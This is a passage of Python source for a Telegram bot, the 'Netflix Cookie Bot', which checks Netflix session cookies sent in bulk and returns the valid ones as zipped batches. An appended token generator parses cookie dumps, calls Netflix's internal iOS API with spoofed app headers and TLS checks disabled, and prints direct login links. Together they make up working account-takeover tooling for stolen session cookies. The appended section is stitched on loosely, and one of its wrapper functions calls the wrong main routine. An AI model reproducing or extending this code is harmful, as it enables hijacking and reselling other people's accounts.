    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="📦 All Valid ZIP", callback_data="valid_zip")],
        [InlineKeyboardButton(text="⬇️ Drop 10-10 Valid", callback_data="valid_drop:0")]
    ])
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

async def handle_valid_zip(update, context):
    valid_files = context.user_data.get('valid_files', [])
    if not valid_files:
        await update.callback_query.edit_message_text("❌ No valid files found or session expired.")
        return
        
    await update.callback_query.edit_message_text(f"⏳ Generating ZIP for {len(valid_files)} valid items...")
    
    import zipfile
    import io
    valid_zip_buffer = io.BytesIO()
    with zipfile.ZipFile(valid_zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for name, txt in valid_files:
            filename = name if name.lower().endswith('.txt') else f"{name}.txt"
            zf.writestr(filename, txt)
            
    valid_zip_buffer.seek(0)
    valid_zip_buffer.name = "Valid_Cookies.zip"
    
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=valid_zip_buffer,
        caption=f"✅ *Here are all {len(valid_files)} Valid Cookies!*",
        parse_mode='Markdown'
    )
    
    # Auto-delete the status message
    async def _del_status():
        await asyncio.sleep(2)
        try:
            await update.callback_query.message.delete()
        except Exception:
            pass
    asyncio.create_task(_del_status())

async def handle_valid_drop(update, context, start: int):
    valid_files = context.user_data.get('valid_files', [])
    if not valid_files:
        await update.callback_query.edit_message_text("❌ No valid files found or session expired.")
        return
        
    total = len(valid_files)
    end = min(start + 10, total)
    slice_items = valid_files[start:end]
    
    if not slice_items:
        await update.callback_query.edit_message_text("✅ All valid cookies have been dropped.")
        return
        
    import zipfile
    import io
    valid_zip_buffer = io.BytesIO()
    with zipfile.ZipFile(valid_zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for name, txt in slice_items:
            filename = name if name.lower().endswith('.txt') else f"{name}.txt"
            zf.writestr(filename, txt)
            
    valid_zip_buffer.seek(0)
    valid_zip_buffer.name = f"Valid_Cookies_{start+1}_to_{end}.zip"
    
    keyboard = None
    if end < total:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text=f"Next 10 ({end+1}-{min(end+10, total)})", callback_data=f"valid_drop:{end}")]
        ])
        
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=valid_zip_buffer,
        caption=f"✅ *Valid Cookies {start+1} to {end}* (Total: {total})",
        parse_mode='Markdown',
        reply_markup=keyboard
    )
    
    # Remove the previous message to keep chat clean
    try:
        await update.callback_query.message.delete()
    except Exception:
        pass

def _start_health_check_server_if_needed():
    """Start lightweight HTTP server on PORT for Railway / PaaS health checks"""
    port_str = os.getenv("PORT")
    if not port_str:
        return
    try:
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import threading

        class HealthCheckHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status": "ok", "service": "nfhunt-bot"}')

            def log_message(self, format, *args):
                pass

        port = int(port_str)
        server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        logger.info(f"Health check HTTP server started on port {port}")
    except Exception as e:
        logger.warning(f"Could not start health check server on port {port_str}: {e}")

def main():
    """Start the bot"""
    import sys
    if sys.platform == "win32":
        sys.stdout.reconfigure(encoding='utf-8')
        
    # Clean artifacts at startup for server/GitHub hygiene
    _cleanup_artifacts(aggressive=True)
    _start_health_check_server_if_needed()
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add only essential handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(on_button))
    
    # Start the bot
    print("🚀 Netflix Cookie Bot - Direct Login Edition Starting...")
    print("✨ No limits, no buttons, no restrictions!")
    print("📝 Send Netflix cookies to get instant results with direct login links!")
    application.run_polling()
    


# --- Netflix Token Generator Code (from Netflix tk folder) ---

import json
import os
import re
import urllib.parse
from datetime import datetime

import requests
from urllib3.exceptions import InsecureRequestWarning

INPUT_FILE = "input.txt"
WATERMARK = (
    "https://github.com/harshitkamboj | "
    "website: harshitkamboj.in | "
    "discord: https://discord.gg/DYJFE9nu5X"
)

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def ensure_input_file():
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, "w", encoding="utf-8") as file_handle:
            file_handle.write("NetflixId=...; SecureNetflixId=...; nfvdid=...\n")
        print("Created input.txt")
        print("Add your cookie in input.txt and run again")
        return None

    with open(INPUT_FILE, "r", encoding="utf-8") as file_handle:
        content = file_handle.read().strip()

    if not content:
        print("input.txt is empty")
        print("Add your cookie in input.txt and run again")
        return None

    return content


def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict


def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token


def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing required cookie: NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=30,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token found in response.")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)


def _token_generator_main():
    print(WATERMARK)
    print()
    raw_cookie = ensure_input_file()
    if raw_cookie is None:
        return

    cookie_dict = extract_cookie_dict(raw_cookie)
    if not cookie_dict:
        print("No valid cookie found in input.txt.")
        print()
        return

    try:
        token, expires = fetch_nftoken(cookie_dict)

        print("Login URL: " + build_nftoken_link(token))
        print()
        print("Expires : " + format_expiry(expires))
    except requests.RequestException as exc:
        print("Request failed: " + str(exc))
        print()
    except ValueError as exc:
        print("Failed: " + str(exc))
        print()
    finally:
        print()
        print(WATERMARK)


def _run_token_generator():
    main()


# --- End Netflix Token Generator Code ---

if __name__ == '__main__':
    main()
